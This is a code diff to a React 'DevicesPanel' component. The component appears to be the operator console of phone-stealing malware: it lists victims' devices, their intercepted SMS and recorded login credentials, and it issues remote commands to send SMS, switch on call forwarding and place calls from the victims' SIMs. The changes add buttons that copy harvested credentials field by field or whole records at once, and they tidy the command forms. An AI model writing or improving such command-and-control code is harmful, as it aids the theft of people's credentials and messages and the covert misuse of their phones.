@@ -39,7 +39,6 @@ export default function DevicesPanel({
     });
   }
 
-  // Online first, then Serial sort
   keys.sort((a, b) => {
     const onA = deviceOnlineStatus[a] ? 1 : 0;
     const onB = deviceOnlineStatus[b] ? 1 : 0;
@@ -60,7 +59,7 @@ export default function DevicesPanel({
   const copyToClipboard = (text, label = "Item") => {
     if (!text) return;
     navigator.clipboard.writeText(String(text));
-    showToast(`📋 Copied: ${String(text).slice(0, 20)}`, "success");
+    showToast(`📋 Copied ${label}: ${String(text).slice(0, 20)}`, "success");
   };
 
   const toggleExpand = (id) => {
@@ -71,14 +70,13 @@ export default function DevicesPanel({
     setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
   };
 
-  // Dual SIM execution command handler
   const handleCommand = (type, devId) => {
     const baseRef = ref(db, `user_data/${devId}`);
 
     if (type === "sendsms") {
       const num = formMemory[`smsNum-${devId}`];
       const body = formMemory[`smsText-${devId}`];
-      const selectedSim = formMemory[`smsSim-${devId}`] || "0"; // Default SIM 1 (index 0)
+      const selectedSim = formMemory[`smsSim-${devId}`] || "0";
 
       if (!num || !body) return showToast("⚠️ Enter recipient number & message!", "warning");
       if (!confirm(`Send SMS from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
@@ -99,7 +97,7 @@ export default function DevicesPanel({
     } 
     else if (type === "fwd_on") {
       const num = formMemory[`fwdNum-${devId}`];
-      const selectedSim = formMemory[`fwdSim-${devId}`] || "0"; // Default SIM 1
+      const selectedSim = formMemory[`fwdSim-${devId}`] || "0";
 
       if (!num) return showToast("⚠️ Enter forward-to phone number!", "warning");
       if (!confirm(`Activate Call Forward on SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
@@ -237,7 +235,6 @@ export default function DevicesPanel({
 
           return (
             <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
-              {/* Header */}
               <div className="card-header" onClick={() => toggleExpand(devId)}>
                 <div style={{ flex: 1, minWidth: 0 }}>
                   <div className="device-name-premium">
@@ -276,7 +273,6 @@ export default function DevicesPanel({
                 </div>
               </div>
 
-              {/* 4-Item Grid Info */}
               <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                 <div className="info-item-premium">
                   <span className="info-label">Device Model</span>
@@ -296,12 +292,10 @@ export default function DevicesPanel({
                 </div>
               </div>
 
-              {/* Toggle Expand */}
               <div className="expand-hint" onClick={() => toggleExpand(devId)}>
                 <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
               </div>
 
-              {/* Expandable Tabs */}
               {expanded && (
                 <div className="expandable-content">
                   <div className="actions-row-premium">
@@ -329,7 +323,17 @@ export default function DevicesPanel({
                     <div className="section-premium">
                       <div className="section-title">
                         <span>Messages ({smsList.length})</span>
-                        <button onClick={() => openSmsModal(devId)} className="btn-gold" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>View Full</button>
+                        <button 
+                          type="button"
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            openSmsModal(devId);
+                          }} 
+                          className="btn-gold" 
+                          style={{ marginLeft: "auto", padding: "4px 12px", fontSize: 11, cursor: "pointer" }}
+                        >
+                          <i className="fas fa-expand" style={{ marginRight: 4 }}></i> View Full
+                        </button>
                       </div>
                       <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
                         {smsList.slice(0, 8).map((m, i) => (
@@ -345,23 +349,52 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* Login Sub-tab */}
+                  {/* Login Sub-tab WITH FIELD & ALL COPY BUTTONS */}
                   {curTab === "login" && (
                     <div className="section-premium">
                       <div className="section-title">
                         <span>Credentials ({loginList.length})</span>
                         <button onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                       </div>
-                      <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                         {loginList.length === 0 ? (
                           <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                         ) : (
                           loginList.map((cred, i) => (
-                            <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6 }}>
+                            <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.3)", padding: 10, borderRadius: 8, border: "1px solid var(--border-color)" }}>
+                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, paddingBottom: 4, borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
+                                <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold)" }}>Record #{i + 1}</span>
+                                <button
+                                  type="button"
+                                  onClick={() => {
+                                    let str = "";
+                                    for (let k in cred) {
+                                      if (!k.startsWith("_") && k !== "key") str += `${k}: ${cred[k]}\n`;
+                                    }
+                                    navigator.clipboard.writeText(str);
+                                    showToast("📋 All Record fields copied!", "success");
+                                  }}
+                                  className="btn-sm"
+                                  style={{ background: "rgba(212,175,55,0.15)", color: "var(--gold)", padding: "2px 8px", borderRadius: 4, cursor: "pointer" }}
+                                >
+                                  <i className="fas fa-copy"></i> Copy All
+                                </button>
+                              </div>
+
                               {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
-                                <div key={k} style={{ display: "flex", justifyContent: "space-between", fontSize: 11, padding: "2px 0" }}>
+                                <div key={k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 11, padding: "3px 0", borderBottom: "1px dashed rgba(255,255,255,0.04)" }}>
                                   <span style={{ color: "var(--text-muted)" }}>{k}:</span>
-                                  <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
+                                  <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+                                    <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
+                                    <button
+                                      type="button"
+                                      onClick={() => copyToClipboard(v, k)}
+                                      style={{ background: "transparent", border: "none", color: "var(--gold)", cursor: "pointer", fontSize: 11 }}
+                                      title={`Copy ${k}`}
+                                    >
+                                      <i className="fas fa-copy"></i>
+                                    </button>
+                                  </div>
                                 </div>
                               ))}
                             </div>
@@ -371,14 +404,13 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* SEND SMS COMMAND (FIXED WITH SIM SELECTOR) */}
+                  {/* Send SMS Command */}
                   {curTab === "sendsms" && (
                     <div className="section-premium">
                       <div className="section-title">
                         <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send SMS Command
                       </div>
 
-                      {/* SIM Selection Buttons */}
                       <div style={{ marginBottom: 10 }}>
                         <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
                           Select Outgoing SIM:
@@ -426,7 +458,7 @@ export default function DevicesPanel({
 
                       <input 
                         type="text" 
-                        placeholder="Recipient Phone Number (e.g. 9876543210)" 
+                        placeholder="Recipient Phone Number" 
                         className="search-input" 
                         style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                         value={formMemory[`smsNum-${devId}`] || ""}
@@ -450,14 +482,13 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* CALL FORWARD COMMAND (FIXED WITH SIM SELECTOR) */}
+                  {/* Call Forward Command */}
                   {curTab === "fwd" && (
                     <div className="section-premium">
                       <div className="section-title">
                         <i className="fas fa-random" style={{ marginRight: 6 }}></i> Call Forward Controls
                       </div>
 
-                      {/* SIM Selection Buttons */}
                       <div style={{ marginBottom: 10 }}>
                         <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
                           Select Target SIM for Forwarding:
@@ -535,52 +566,16 @@ export default function DevicesPanel({
                   {curTab === "call" && (
                     <div className="section-premium">
                       <div className="section-title">Make Call Command</div>
-
-                      <div style={{ marginBottom: 10, display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
-                        <button
-                          type="button"
-                          onClick={() => setFormMemory(p => ({ ...p, [`callSim-${devId}`]: "0" }))}
-                          style={{
-                            padding: "6px",
-                            borderRadius: 6,
-                            border: (formMemory[`callSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
-                            background: (formMemory[`callSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
-                            color: (formMemory[`callSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
-                            fontSize: 11,
-                            fontWeight: 600,
-                            cursor: "pointer"
-                          }}
-                        >
-                          SIM 1
-                        </button>
-                        <button
-                          type="button"
-                          onClick={() => setFormMemory(p => ({ ...p, [`callSim-${devId}`]: "1" }))}
-                          style={{
-                            padding: "6px",
-                            borderRadius: 6,
-                            border: formMemory[`callSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
-                            background: formMemory[`callSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
-                            color: formMemory[`callSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
-                            fontSize: 11,
-                            fontWeight: 600,
-                            cursor: "pointer"
-                          }}
-                        >
-                          SIM 2
-                        </button>
-                      </div>
-
                       <input 
                         type="text" 
-                        placeholder="Enter target phone number" 
+                        placeholder="Target Phone Number" 
                         className="search-input" 
                         style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                         value={formMemory[`callNum-${devId}`] || ""}
                         onChange={(e) => setFormMemory(p => ({ ...p, [`callNum-${devId}`]: e.target.value }))}
                       />
                       <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
-                        <i className="fas fa-phone"></i> Make Call from SIM {(Number(formMemory[`callSim-${devId}`] || "0") + 1)}
+                        <i className="fas fa-phone"></i> Execute Call
                       </button>
                     </div>
                   )}
